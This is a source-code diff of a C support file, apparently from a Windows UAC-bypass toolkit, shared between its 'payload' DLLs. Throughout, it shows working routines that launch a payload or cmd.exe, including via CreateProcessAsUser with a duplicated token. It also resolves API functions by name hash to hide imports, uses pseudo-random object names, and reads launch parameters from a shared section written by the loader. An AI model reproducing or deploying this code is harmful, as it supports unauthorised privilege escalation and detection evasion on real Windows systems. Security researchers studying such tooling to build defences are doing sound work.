@@ -4,9 +4,9 @@
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     3.27
+*  VERSION:     3.50
 *
-*  DATE:        10 Sep 2020
+*  DATE:        14 Sep 2020
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -22,6 +22,165 @@
 #include "shared.h"
 
 /*
+* ucmxHeapAlloc
+*
+* Purpose:
+*
+* Wrapper for RtlAllocateHeap.
+*
+*/
+PVOID ucmxHeapAlloc(
+    _In_ SIZE_T NumberOfBytes
+)
+{
+    return RtlAllocateHeap(NtCurrentPeb()->ProcessHeap,
+        HEAP_ZERO_MEMORY,
+        NumberOfBytes);
+}
+
+/*
+* ucmxHeapFree
+*
+* Purpose:
+*
+* Wrapper for RtlFreeHeap.
+*
+*/
+BOOLEAN ucmxHeapFree(
+    _In_ PVOID BaseAddress
+)
+{
+    return RtlFreeHeap(NtCurrentPeb()->ProcessHeap,
+        0,
+        BaseAddress);
+}
+
+/*
+* ucmIsProcess32bit
+*
+* Purpose:
+*
+* Return TRUE if given process is under WOW64, FALSE otherwise.
+*
+*/
+BOOLEAN ucmIsProcess32bit(
+    _In_ HANDLE hProcess
+)
+{
+    NTSTATUS status;
+    PROCESS_EXTENDED_BASIC_INFORMATION pebi;
+
+    if (hProcess == NULL) {
+        return FALSE;
+    }
+
+    //query if this is wow64 process
+    RtlSecureZeroMemory(&pebi, sizeof(pebi));
+    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
+    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
+    if (NT_SUCCESS(status)) {
+        return (pebi.IsWow64Process == 1);
+    }
+    return FALSE;
+}
+
+/*
+* ucmxQuerySystemDirectory
+*
+* Purpose:
+*
+* Query system directory full path including slash (with wow64 support).
+*
+*/
+VOID ucmxQuerySystemDirectory(
+    _Inout_ LPWSTR lpSystemDirectory,
+    _In_ BOOLEAN CheckWow64)
+{
+    WCHAR szSystem32Prep[] = { L'\\', L's', L'y', L's', 0 };
+    WCHAR szSystem32Final[] = { L't', L'e', L'm', L'3', L'2', L'\\', 0 };
+    WCHAR szWow64Final[] = { L'w', L'o', L'w', L'6', L'4', L'\\', 0 };
+
+    _strcpy(lpSystemDirectory, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(lpSystemDirectory, szSystem32Prep);
+
+    if (CheckWow64) {
+        if (ucmIsProcess32bit(NtCurrentProcess())) {
+            _strcat(lpSystemDirectory, szWow64Final);
+        }
+        else {
+            _strcat(lpSystemDirectory, szSystem32Final);
+        }
+    }
+    else {
+        _strcat(lpSystemDirectory, szSystem32Final);
+    }
+}
+
+/*
+* ucmxBinTextEncode
+*
+* Purpose:
+*
+* Create pseudo random string from UI64 value.
+*
+*/
+VOID ucmxBinTextEncode(
+    _In_ unsigned __int64 x,
+    _Inout_ wchar_t* s
+)
+{
+    char    tbl[64];
+    char    c = 0;
+    int     p;
+
+    tbl[62] = '-';
+    tbl[63] = '_';
+
+    for (c = 0; c < 26; ++c)
+    {
+        tbl[c] = 'A' + c;
+        tbl[26 + c] = 'a' + c;
+        if (c < 10)
+            tbl[52 + c] = '0' + c;
+    }
+
+    for (p = 0; p < 13; ++p)
+    {
+        c = x & 0x3f;
+        x >>= 5;
+        *s = (wchar_t)tbl[c];
+        ++s;
+    }
+
+    *s = 0;
+}
+
+/*
+* ucmxGenerateSharedObjectName
+*
+* Purpose:
+*
+* Create pseudo random object name from it ID.
+*
+*/
+VOID ucmxGenerateSharedObjectName(
+    _In_ WORD ObjectId,
+    _Inout_ LPWSTR lpBuffer
+)
+{
+    ULARGE_INTEGER value;
+
+    value.LowPart = MAKELONG(
+        MAKEWORD(UCM_VERSION_BUILD, UCM_VERSION_REVISION),
+        MAKEWORD(UCM_VERSION_MINOR, UCM_VERSION_MAJOR));
+
+    value.HighPart = MAKELONG(UACME_SHARED_BASE_ID, ObjectId);
+
+    ucmxBinTextEncode(value.QuadPart, lpBuffer);
+}
+
+
+/*
 * ucmxCreateBoundaryDescriptorSID
 *
 * Purpose:
@@ -30,110 +189,28 @@
 *
 */
 PSID ucmxCreateBoundaryDescriptorSID(
-    SID_IDENTIFIER_AUTHORITY *SidAuthority,
+    SID_IDENTIFIER_AUTHORITY* SidAuthority,
     UCHAR SubAuthorityCount,
-    ULONG *SubAuthorities
+    ULONG* SubAuthorities
 )
 {
-    BOOL    bResult = FALSE;
-    ULONG   i;
-    PSID    pSid = NULL;
+    ULONG i;
+    PSID  pSid;
 
-    do {
+    pSid = ucmxHeapAlloc(RtlLengthRequiredSid(SubAuthorityCount));
+    if (pSid) {
 
-        pSid = RtlAllocateHeap(
-            NtCurrentPeb()->ProcessHeap,
-            HEAP_ZERO_MEMORY,
-            RtlLengthRequiredSid(SubAuthorityCount));
+        if (NT_SUCCESS(RtlInitializeSid(pSid, SidAuthority, SubAuthorityCount))) {
 
-        if (pSid == NULL)
-            break;
+            for (i = 0; i < SubAuthorityCount; i++)
+                *RtlSubAuthoritySid(pSid, i) = SubAuthorities[i];
 
-        if (!NT_SUCCESS(RtlInitializeSid(pSid, SidAuthority, SubAuthorityCount)))
-            break;
+            return pSid;
 
-        for (i = 0; i < SubAuthorityCount; i++)
-            *RtlSubAuthoritySid(pSid, i) = SubAuthorities[i];
-
-        bResult = TRUE;
-
-    } while (FALSE);
-
-    if (bResult == FALSE) {
-        if (pSid) RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, pSid);
-        pSid = NULL;
-    }
-
-    return pSid;
-}
-
-/*
-* ucmReadSharedParameters
-*
-* Purpose:
-*
-* Read shared parameters from Akagi.
-*
-* Return TRUE on success, FALSE otherwise.
-*
-*/
-_Success_(return == TRUE)
-BOOL ucmReadSharedParameters(
-    _Out_ UACME_PARAM_BLOCK *SharedParameters
-)
-{
-    BOOL bResult = FALSE;
-    ULONG Crc32;
-    HANDLE hNamespace = NULL, hSection = NULL;
-    PVOID SectionBuffer = NULL;
-    SIZE_T ViewSize = PAGE_SIZE;
-
-    UNICODE_STRING usName = RTL_CONSTANT_STRING(AKAGI_SHARED_SECTION);
-    OBJECT_ATTRIBUTES obja;
-
-    UACME_PARAM_BLOCK sharedParameters;
-
-    do {
-
-        hNamespace = ucmOpenAkagiNamespace();
-        if (hNamespace == NULL)
-            break;
-
-        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, hNamespace, NULL);
-        if (NT_SUCCESS(NtOpenSection(&hSection, SECTION_ALL_ACCESS, &obja))) {
-            if (NT_SUCCESS(NtMapViewOfSection(
-                hSection,
-                NtCurrentProcess(),
-                &SectionBuffer,
-                0,
-                PAGE_SIZE,
-                NULL,
-                &ViewSize,
-                ViewUnmap,
-                MEM_TOP_DOWN,
-                PAGE_READONLY)))
-            {
-                RtlSecureZeroMemory(&sharedParameters, sizeof(UACME_PARAM_BLOCK));
-                RtlCopyMemory(&sharedParameters, SectionBuffer, sizeof(UACME_PARAM_BLOCK));
-                NtUnmapViewOfSection(NtCurrentProcess(), hSection);
-
-                //
-                // Validate data.
-                //
-                Crc32 = sharedParameters.Crc32;
-                sharedParameters.Crc32 = 0;
-                if (Crc32 == RtlComputeCrc32(0, &sharedParameters, sizeof(UACME_PARAM_BLOCK))) {
-                    RtlCopyMemory(SharedParameters, &sharedParameters, sizeof(UACME_PARAM_BLOCK));
-                    bResult = TRUE;
-                }
-            }
-            NtClose(hSection);
         }
-        NtClose(hNamespace);
-
-    } while (FALSE);
-
-    return bResult;
+        ucmxHeapFree(pSid);
+    }
+    return NULL;
 }
 
 /*
@@ -155,10 +232,15 @@ HANDLE ucmOpenAkagiNamespace(
     PSID pWorldSid;
     SID_IDENTIFIER_AUTHORITY SidWorldAuthority = SECURITY_WORLD_SID_AUTHORITY;
 
-    UNICODE_STRING usName = RTL_CONSTANT_STRING(BDESCRIPTOR_NAME);
+    UNICODE_STRING usName;
     OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);
 
     ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0 };
+    WCHAR szBoundaryDescriptorName[128];
+
+    RtlSecureZeroMemory(&szBoundaryDescriptorName, sizeof(szBoundaryDescriptorName));
+    ucmxGenerateSharedObjectName((WORD)AKAGI_BDESCRIPTOR_NAME_ID, szBoundaryDescriptorName);
+    RtlInitUnicodeString(&usName, szBoundaryDescriptorName);
 
     do {
         //
@@ -197,6 +279,81 @@ HANDLE ucmOpenAkagiNamespace(
 }
 
 /*
+* ucmReadSharedParameters
+*
+* Purpose:
+*
+* Read shared parameters from Akagi.
+*
+* Return TRUE on success, FALSE otherwise.
+*
+*/
+_Success_(return == TRUE)
+BOOL ucmReadSharedParameters(
+    _Out_ UACME_PARAM_BLOCK * SharedParameters
+)
+{
+    BOOL bResult = FALSE;
+    ULONG Crc32;
+    HANDLE hNamespace = NULL, hSection = NULL;
+    PVOID SectionBuffer = NULL;
+    SIZE_T ViewSize = PAGE_SIZE;
+
+    UNICODE_STRING usName;
+    OBJECT_ATTRIBUTES obja;
+
+    UACME_PARAM_BLOCK sharedParameters;
+    WCHAR szSectionName[128];
+
+    do {
+
+        hNamespace = ucmOpenAkagiNamespace();
+        if (hNamespace == NULL)
+            break;
+
+        RtlSecureZeroMemory(&szSectionName, sizeof(szSectionName));
+        ucmxGenerateSharedObjectName((WORD)AKAGI_SHARED_SECTION_ID, szSectionName);
+        RtlInitUnicodeString(&usName, szSectionName);
+
+        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, hNamespace, NULL);
+        if (NT_SUCCESS(NtOpenSection(&hSection, SECTION_ALL_ACCESS, &obja))) {
+            if (NT_SUCCESS(NtMapViewOfSection(
+                hSection,
+                NtCurrentProcess(),
+                &SectionBuffer,
+                0,
+                PAGE_SIZE,
+                NULL,
+                &ViewSize,
+                ViewUnmap,
+                MEM_TOP_DOWN,
+                PAGE_READONLY)))
+            {
+                RtlSecureZeroMemory(&sharedParameters, sizeof(UACME_PARAM_BLOCK));
+                RtlCopyMemory(&sharedParameters, SectionBuffer, sizeof(UACME_PARAM_BLOCK));
+                NtUnmapViewOfSection(NtCurrentProcess(), hSection);
+
+                //
+                // Validate data.
+                //
+                Crc32 = sharedParameters.Crc32;
+                sharedParameters.Crc32 = 0;
+                if (Crc32 == RtlComputeCrc32(0, &sharedParameters, sizeof(UACME_PARAM_BLOCK))) {
+                    sharedParameters.Crc32 = Crc32;
+                    RtlCopyMemory(SharedParameters, &sharedParameters, sizeof(UACME_PARAM_BLOCK));
+                    bResult = TRUE;
+                }
+            }
+            NtClose(hSection);
+        }
+        NtClose(hNamespace);
+
+    } while (FALSE);
+
+    return bResult;
+}
+
+/*
 * ucmSetCompletion
 *
 * Purpose:
@@ -222,36 +379,6 @@ VOID ucmSetCompletion(
             NtClose(hEvent);
         }
         NtClose(hNamespace);
-    }
-}
-
-/*
-* ucmPingBack
-*
-* Purpose:
-*
-* Does what it called.
-*
-*/
-VOID ucmPingBack(
-    VOID
-)
-{
-    HANDLE hEvent = NULL;
-    UNICODE_STRING usSignalEvent = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\CZ2128");
-    OBJECT_ATTRIBUTES obja;
-
-#ifdef _TRACE_CALL 
-    OutputDebugString(L"service>ping back\r\n");
-#endif
-
-    InitializeObjectAttributes(&obja, &usSignalEvent, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    if (NT_SUCCESS(NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, &obja))) {
-#ifdef _TRACE_CALL
-        OutputDebugString(L"service>>pingback event found");
-#endif
-        NtSetEvent(hEvent, NULL);
-        NtClose(hEvent);
     }
 }
 
@@ -285,94 +412,123 @@ BOOLEAN ucmPrivilegeEnabled(
 }
 
 /*
+* ucmFormatTimeOut
+*
+* Purpose:
+*
+* Translates a Win32 style timeout to an NT relative timeout.
+*
+*/
+PLARGE_INTEGER ucmFormatTimeOut(
+    _Out_ PLARGE_INTEGER TimeOut,
+    _In_ DWORD Milliseconds
+)
+{
+    if ((LONG)Milliseconds == -1) {
+        return(NULL);
+    }
+    TimeOut->QuadPart = UInt32x32To64(Milliseconds, 10000);
+    TimeOut->QuadPart *= -1;
+    return TimeOut;
+}
+
+/*
 * ucmCreateSyncMutant
 *
 * Purpose:
 *
-* Create mutant for synchronization.
+* Create sync mutex.
 *
 */
 NTSTATUS ucmCreateSyncMutant(
     _Out_ PHANDLE phMutant
 )
 {
-    UNICODE_STRING us = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Nagumo");
+    UNICODE_STRING usName;
     OBJECT_ATTRIBUTES obja;
 
-    InitializeObjectAttributes(&obja, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    WCHAR szObjectName[256];
+    WCHAR szName[128];
+
+    RtlSecureZeroMemory(&szName, sizeof(szName));
+    _strcpy(szObjectName, L"\\BaseNamedObjects\\");
+    ucmxGenerateSharedObjectName(FUBUKI_SYNC_MUTEX_ID, szName);
+    _strcat(szObjectName, szName);
+
+    RtlInitUnicodeString(&usName, szObjectName);
+    InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     return NtCreateMutant(phMutant, MUTANT_ALL_ACCESS, &obja, FALSE);
 }
 
 /*
-* ucmLdrGetProcAddress
+* ucmGetHashForString
 *
 * Purpose:
 *
-* Reimplemented GetProcAddress.
+* Calculates specific hash for string.
 *
 */
-LPVOID ucmLdrGetProcAddress(
-    _In_ PCHAR ImageBase,
-    _In_ PCHAR RoutineName
+DWORD ucmGetHashForString(
+    _In_ char* s
 )
 {
-    USHORT OrdinalNumber;
-    PULONG NameTableBase;
-    PUSHORT NameOrdinalTableBase;
-    PULONG Addr;
-    LONG Result, High, Low = 0, Middle = 0;
-    LPVOID FunctionAddress = NULL;
-    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
+    DWORD h = 0;
 
-    PIMAGE_FILE_HEADER			fh1 = NULL;
-    PIMAGE_OPTIONAL_HEADER32	oh32 = NULL;
-    PIMAGE_OPTIONAL_HEADER64	oh64 = NULL;
-
-    fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD));
-    oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
-    oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;
-
-    if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
-        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
-            oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    }
-    else {
-        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
-            oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    while (*s != 0) {
+        h ^= *s;
+        h = RotateLeft32(h, 3) + 1;
+        s++;
     }
 
-    NameTableBase = (PULONG)(ImageBase + (ULONG)ExportDirectory->AddressOfNames);
-    NameOrdinalTableBase = (PUSHORT)(ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
-    High = ExportDirectory->NumberOfNames - 1;
-    while (High >= Low) {
+    return h;
+}
 
-        Middle = (Low + High) >> 1;
+/*
+* ucmGetProcedureAddressByHash
+*
+* Purpose:
+*
+* Return pointer to function in dll from name hash value.
+*
+*/
+LPVOID ucmGetProcedureAddressByHash(
+    _In_ PVOID ImageBase,
+    _In_ DWORD ProcedureHash
+)
+{
+    DWORD i;
+    ULONG sz = 0;
 
-        Result = _strcmpi_a(
-            RoutineName,
-            (PCHAR)(ImageBase + NameTableBase[Middle])
-        );
+    IMAGE_DOS_HEADER* DosHeader;
+    IMAGE_EXPORT_DIRECTORY* Exports;
+    PDWORD Names, Functions;
+    PWORD Ordinals;
 
-        if (Result < 0)
-            High = Middle - 1;
-        else
-            if (Result > 0)
-                Low = Middle + 1;
-            else
-                break;
-    } //while
-    if (High < Low)
+    DWORD_PTR FunctionPtr;
+
+    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
+
+    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase,
+        TRUE,
+        IMAGE_DIRECTORY_ENTRY_EXPORT,
+        &sz);
+
+    if (Exports == NULL)
         return NULL;
 
-    OrdinalNumber = NameOrdinalTableBase[Middle];
-    if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
-        return NULL;
+    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
+    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
+    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);
 
-    Addr = (PDWORD)((DWORD_PTR)ImageBase + ExportDirectory->AddressOfFunctions);
-    FunctionAddress = (LPVOID)((DWORD_PTR)ImageBase + Addr[OrdinalNumber]);
+    for (i = 0; i < Exports->NumberOfNames; i++) {
+        if (ucmGetHashForString((char*)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
+            FunctionPtr = Functions[Ordinals[i]];
+            return (PBYTE)ImageBase + FunctionPtr;
+        }
+    }
 
-    return FunctionAddress;
+    return NULL;
 }
 
 /*
@@ -458,6 +614,8 @@ DWORD ucmExpandEnvironmentStrings(
     return 0;
 }
 
+#define SI_MAX_BUFFER_LENGTH (512 * 1024 * 1024)
+
 /*
 * ucmGetSystemInfo
 *
@@ -466,46 +624,43 @@ DWORD ucmExpandEnvironmentStrings(
 * Returns buffer with system information by given InfoClass.
 *
 * Returned buffer must be freed with HeapFree after usage.
-* Function will return error after 20 attempts.
 *
 */
 PVOID ucmGetSystemInfo(
-    _In_ SYSTEM_INFORMATION_CLASS InfoClass
+    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
 )
 {
-    INT			c = 0;
-    PVOID		Buffer = NULL;
-    ULONG		Size = PAGE_SIZE;
-    NTSTATUS	status;
-    ULONG       memIO;
+    PVOID       buffer = NULL;
+    ULONG       bufferSize = PAGE_SIZE;
+    NTSTATUS    ntStatus;
+    ULONG       returnedLength = 0;
 
-    do {
-        Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)Size);
-        if (Buffer != NULL) {
-            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
-        }
-        else {
+    buffer = ucmxHeapAlloc((SIZE_T)bufferSize);
+    if (buffer == NULL)
+        return NULL;
+
+    while ((ntStatus = NtQuerySystemInformation(
+        SystemInformationClass,
+        buffer,
+        bufferSize,
+        &returnedLength)) == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        ucmxHeapFree(buffer);
+        bufferSize *= 2;
+
+        if (bufferSize > SI_MAX_BUFFER_LENGTH)
             return NULL;
-        }
-        if (status == STATUS_INFO_LENGTH_MISMATCH) {
-            RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
-            Buffer = NULL;
-            Size *= 2;
-            c++;
-            if (c > 20) {
-                status = STATUS_SECRET_TOO_LONG;
-                break;
-            }
-        }
-    } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-    if (NT_SUCCESS(status)) {
-        return Buffer;
+        buffer = ucmxHeapAlloc((SIZE_T)bufferSize);
     }
 
-    if (Buffer) {
-        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
+    if (NT_SUCCESS(ntStatus)) {
+        return buffer;
     }
+
+    if (buffer)
+        ucmxHeapFree(buffer);
+
     return NULL;
 }
 
@@ -529,7 +684,6 @@ BOOL ucmLaunchPayload(
 
     DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;
 
-    HANDLE                  ProcessHeap = NtCurrentPeb()->ProcessHeap;
     LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
     SIZE_T                  memIO;
 
@@ -537,12 +691,8 @@ BOOL ucmLaunchPayload(
     //
     // Query working directory.
     //
-    // Note: 2.84
-    // To provide compatibility with %systemroot% replacement method (44) read systemroot from UserSharedData.
-    //
     RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-    _strcpy(sysdir, USER_SHARED_DATA->NtSystemRoot);
-    _strcat(sysdir, L"\\system32\\");
+    ucmxQuerySystemDirectory(sysdir, TRUE);
 
     //
     // Query startup info from parent.
@@ -554,24 +704,21 @@ BOOL ucmLaunchPayload(
     //
     // Determine what we want to execute, custom parameter or default cmd.exe
     //
-    if ((pszPayload) && (cbPayload)) {
+    if (pszPayload && cbPayload) {
 
         //
         // We can use custom payload, copy it to internal buffer.
         //
         memIO = PAGE_SIZE + (SIZE_T)cbPayload;
 
-        lpCommandLine = (LPWSTR)RtlAllocateHeap(
-            ProcessHeap,
-            HEAP_ZERO_MEMORY,
-            (SIZE_T)memIO);
+        lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);
 
         if (lpCommandLine) {
 
             dwCreationFlags = 0;
             bCommandLineAllocated = TRUE;
-            RtlCopyMemory(
-                lpCommandLine,
+
+            RtlCopyMemory(lpCommandLine,
                 pszPayload,
                 cbPayload);
 
@@ -589,7 +736,6 @@ BOOL ucmLaunchPayload(
         lpApplicationName = cmdbuf;
         lpCommandLine = NULL;
         bCommandLineAllocated = FALSE;
-        dwCreationFlags = CREATE_NEW_CONSOLE;
     }
 
     startupInfo.dwFlags = STARTF_USESHOWWINDOW;
@@ -628,7 +774,7 @@ BOOL ucmLaunchPayload(
     // Post execution cleanup if required.
     //
     if (bCommandLineAllocated)
-        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);
+        ucmxHeapFree(lpCommandLine);
 
     return bResult;
 }
@@ -652,9 +798,8 @@ BOOL ucmLaunchPayloadEx(
     STARTUPINFO             startupInfo;
     PROCESS_INFORMATION     processInfo;
 
-    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE, cch;
+    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;
 
-    HANDLE                  ProcessHeap = NtCurrentPeb()->ProcessHeap;
     LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
     SIZE_T                  memIO;
 
@@ -665,9 +810,7 @@ BOOL ucmLaunchPayloadEx(
     // Query working directory.
     //
     RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-    cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
-    if ((cch == 0) || (cch > MAX_PATH))
-        return bResult;
+    ucmxQuerySystemDirectory(sysdir, TRUE);
 
     //
     // Query startup info from parent.
@@ -679,24 +822,21 @@ BOOL ucmLaunchPayloadEx(
     //
     // Determine what we want to execute, custom parameter or default cmd.exe
     //
-    if ((pszPayload) && (cbPayload)) {
+    if (pszPayload && cbPayload) {
 
         //
         // We can use custom payload, copy it to internal buffer.
         //
         memIO = PAGE_SIZE + (SIZE_T)cbPayload;
 
-        lpCommandLine = (LPWSTR)RtlAllocateHeap(
-            ProcessHeap,
-            HEAP_ZERO_MEMORY,
-            (SIZE_T)memIO);
+        lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);
 
         if (lpCommandLine) {
 
             dwCreationFlags = 0;
             bCommandLineAllocated = TRUE;
-            RtlCopyMemory(
-                lpCommandLine,
+
+            RtlCopyMemory(lpCommandLine,
                 pszPayload,
                 cbPayload);
 
@@ -714,7 +854,6 @@ BOOL ucmLaunchPayloadEx(
         lpApplicationName = cmdbuf;
         lpCommandLine = NULL;
         bCommandLineAllocated = FALSE;
-        dwCreationFlags = CREATE_NEW_CONSOLE;
     }
 
     startupInfo.dwFlags = STARTF_USESHOWWINDOW;
@@ -749,7 +888,7 @@ BOOL ucmLaunchPayloadEx(
     // Post execution cleanup if required.
     //
     if (bCommandLineAllocated)
-        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);
+        ucmxHeapFree(lpCommandLine);
 
     return bResult;
 }
@@ -763,6 +902,7 @@ BOOL ucmLaunchPayloadEx(
 *
 */
 BOOL ucmLaunchPayload2(
+    _In_ PFNCREATEPROCESSASUSERW pCreateProcessAsUser,
     _In_ BOOL bIsLocalSystem,
     _In_ ULONG SessionId,
     _In_opt_ LPWSTR pszPayload,
@@ -774,9 +914,8 @@ BOOL ucmLaunchPayload2(
     STARTUPINFO                 startupInfo;
     PROCESS_INFORMATION         processInfo;
 
-    DWORD                       dwCreationFlags = CREATE_NEW_CONSOLE, cch;
+    DWORD                       dwCreationFlags = CREATE_NEW_CONSOLE;
 
-    HANDLE                      ProcessHeap = NtCurrentPeb()->ProcessHeap;
     LPWSTR                      lpApplicationName = NULL, lpCommandLine = NULL;
     SIZE_T                      memIO;
 
@@ -887,13 +1026,7 @@ BOOL ucmLaunchPayload2(
         // Query working directory.
         //
         RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-        cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
-        if ((cch == 0) || (cch > MAX_PATH)) {
-#ifdef _TRACE_CALL
-            OutputDebugString(L"ucmExpandEnvironmentStrings failed");
-#endif //_TRACE_CALL
-            break;
-        }
+        ucmxQuerySystemDirectory(sysdir, FALSE);
 
 #ifdef _TRACE_CALL
         OutputDebugString(sysdir);
@@ -909,28 +1042,21 @@ BOOL ucmLaunchPayload2(
         //
         // Determine what we want to execute, custom parameter or default cmd.exe
         //
-        if ((pszPayload) && (cbPayload)) {
-
-#ifdef _TRACE_CALL
-            OutputDebugString(L"payload present\r\n");
-#endif //_TRACE_CALL
+        if (pszPayload && cbPayload) {
 
             //
             // We can use custom payload, copy it to internal buffer.
             //
             memIO = PAGE_SIZE + (SIZE_T)cbPayload;
 
-            lpCommandLine = (LPWSTR)RtlAllocateHeap(
-                ProcessHeap,
-                HEAP_ZERO_MEMORY,
-                (SIZE_T)memIO);
+            lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);
 
             if (lpCommandLine) {
 
                 dwCreationFlags = 0;
                 bCommandLineAllocated = TRUE;
-                RtlCopyMemory(
-                    lpCommandLine,
+
+                RtlCopyMemory(lpCommandLine,
                     pszPayload,
                     cbPayload);
 
@@ -948,7 +1074,6 @@ BOOL ucmLaunchPayload2(
             lpApplicationName = cmdbuf;
             lpCommandLine = NULL;
             bCommandLineAllocated = FALSE;
-            dwCreationFlags = CREATE_NEW_CONSOLE;
         }
 
         startupInfo.dwFlags = STARTF_USESHOWWINDOW;
@@ -968,7 +1093,7 @@ BOOL ucmLaunchPayload2(
         //
         // Launch payload.
         //
-        bResult = CreateProcessAsUser(
+        bResult = pCreateProcessAsUser(
             hDupToken,
             lpApplicationName,
             lpCommandLine,
@@ -1006,7 +1131,7 @@ BOOL ucmLaunchPayload2(
     // Post execution cleanup if required.
     //
     if (bCommandLineAllocated)
-        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);
+        ucmxHeapFree(lpCommandLine);
 
     if (bSrvExec) {
         if (hToken)
@@ -1017,6 +1142,7 @@ BOOL ucmLaunchPayload2(
 
     return bResult;
 }
+
 
 /*
 * ucmQueryRuntimeInfo
@@ -1036,10 +1162,9 @@ LPWSTR ucmQueryRuntimeInfo(
     ULONG SessionId = NtCurrentPeb()->SessionId;
 
     HANDLE hToken = NULL;
-    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;
 
     PTOKEN_MANDATORY_LABEL pTIL = NULL;
-    TOKEN_USER *ptu = NULL;
+    TOKEN_USER* ptu = NULL;
 
     PROCESS_BASIC_INFORMATION pbi;
     PROCESS_EXTENDED_BASIC_INFORMATION pebi;
@@ -1059,10 +1184,7 @@ LPWSTR ucmQueryRuntimeInfo(
     if (GetModuleFileName(NULL, (LPWSTR)&szBuffer, MAX_PATH) == 0)
         return NULL;
 
-    lpReport = (LPWSTR)RtlAllocateHeap(
-        hHeap,
-        HEAP_ZERO_MEMORY,
-        0x2000);
+    lpReport = (LPWSTR)ucmxHeapAlloc(2 * PAGE_SIZE);
     if (lpReport == NULL)
         return NULL;
 
@@ -1119,7 +1241,7 @@ LPWSTR ucmQueryRuntimeInfo(
                 }
                 pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
             }
-            RtlFreeHeap(hHeap, 0, ProcessList);
+            ucmxHeapFree(ProcessList);
         }
 
         if (bFound) {
@@ -1157,10 +1279,7 @@ LPWSTR ucmQueryRuntimeInfo(
 
         if (status == STATUS_BUFFER_TOO_SMALL) {
 
-            pTIL = (PTOKEN_MANDATORY_LABEL)RtlAllocateHeap(
-                hHeap,
-                HEAP_ZERO_MEMORY,
-                LengthNeeded);
+            pTIL = (PTOKEN_MANDATORY_LABEL)ucmxHeapAlloc(LengthNeeded);
 
             if (pTIL) {
 
@@ -1208,7 +1327,7 @@ LPWSTR ucmQueryRuntimeInfo(
                     _strncpy(_strend(szBuffer), 40, lpValue, 40);
                     _strcat(lpReport, szBuffer);
                 }
-                RtlFreeHeap(hHeap, 0, pTIL);
+                ucmxHeapFree(pTIL);
             }
         }
 
@@ -1225,10 +1344,7 @@ LPWSTR ucmQueryRuntimeInfo(
 
         if (status == STATUS_BUFFER_TOO_SMALL) {
 
-            ptu = (PTOKEN_USER)RtlAllocateHeap(
-                hHeap,
-                HEAP_ZERO_MEMORY,
-                LengthNeeded);
+            ptu = (PTOKEN_USER)ucmxHeapAlloc(LengthNeeded);
 
             if (ptu) {
 
@@ -1308,7 +1424,7 @@ LPWSTR ucmQueryRuntimeInfo(
 
                 }
 
-                RtlFreeHeap(hHeap, 0, ptu);
+                ucmxHeapFree(ptu);
             }
         }
 
